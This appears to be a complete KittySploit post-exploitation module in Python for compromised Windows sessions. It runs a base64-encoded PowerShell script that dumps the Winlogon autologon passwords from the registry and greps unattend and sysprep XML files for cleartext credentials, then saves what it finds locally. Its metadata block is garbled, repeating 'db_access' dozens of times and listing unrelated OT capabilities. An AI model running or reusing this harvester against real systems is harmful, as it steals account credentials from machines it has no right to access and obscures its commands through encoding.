#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Search Winlogon autologon registry values and unattend/sysprep XML files for
embedded credentials on a Windows session.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"


class Module(Post):
    __info__ = {
        "name": "Windows Gather Autologon and Unattend Secrets",
        "description": (
            "Read Winlogon autologon values from the registry and scan Panther/Sysprep "
            "unattend XML files for cleartext passwords on a Windows session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1552/",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    save_local = OptBool(True, "Save results under ./output", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _powershell_script(self) -> str:
        return r"""
$sections = New-Object System.Collections.Generic.List[string]

# --- Winlogon autologon ---
$winlogonPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
if (Test-Path -LiteralPath $winlogonPath) {
  $wl = Get-ItemProperty -LiteralPath $winlogonPath -ErrorAction SilentlyContinue
  $auto = [PSCustomObject]@{
    AutoAdminLogon      = $wl.AutoAdminLogon
    DefaultUserName     = $wl.DefaultUserName
    DefaultDomainName   = $wl.DefaultDomainName
    DefaultPassword     = $wl.DefaultPassword
    AltDefaultUserName  = $wl.AltDefaultUserName
    AltDefaultPassword  = $wl.AltDefaultPassword
    LastUsedUsername    = $wl.LastUsedUsername
  }
  $sections.Add("=== Winlogon (HKLM) ===`n$($auto | Format-List | Out-String)")
} else {
  $sections.Add("=== Winlogon (HKLM) ===`n(not accessible)")
}

# --- Unattend / sysprep XML ---
$searchRoots = @(
  'C:\Windows\Panther',
  'C:\Windows\System32\Sysprep',
  'C:\'
) | Select-Object -Unique

$patterns = @(
  'unattend.xml', 'Unattend.xml', 'autounattend.xml', 'AutoUnattend.xml'
)
$xmlFiles = New-Object System.Collections.Generic.List[string]
foreach ($root in $searchRoots) {
  if (-not (Test-Path -LiteralPath $root)) { continue }
  foreach ($name in $patterns) {
    Get-ChildItem -LiteralPath $root -Filter $name -File -ErrorAction SilentlyContinue | ForEach-Object {
      $xmlFiles.Add($_.FullName)
    }
  }
}

$xmlFiles = $xmlFiles | Select-Object -Unique
$keyword = '(?i)(password|passwd|administratorpassword|autologon|defaultpassword|credentials)'

if ($xmlFiles.Count -eq 0) {
  $sections.Add("=== Unattend / Sysprep XML ===`n(no unattend XML files found)")
} else {
  foreach ($file in $xmlFiles) {
    $hits = Select-String -LiteralPath $file -Pattern $keyword -ErrorAction SilentlyContinue
    if ($hits) {
      $block = ($hits | ForEach-Object { "$($_.LineNumber): $($_.Line.Trim())" }) -join "`n"
      $sections.Add("=== $file ===`n$block")
    } else {
      $sections.Add("=== $file ===`n(file found, no obvious password keywords)")
    }
  }
}

$sections -join "`n`n"
"""

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False
        return True

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"autologon_unattend_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")

        print_status("Searching Winlogon autologon and unattend XML secrets...")
        result = self._run_powershell(self._powershell_script())

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned")

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            print_success(f"Results saved to ./{local_path}")

        print_success("Autologon / unattend scan completed")
        print_info(result)
        return True
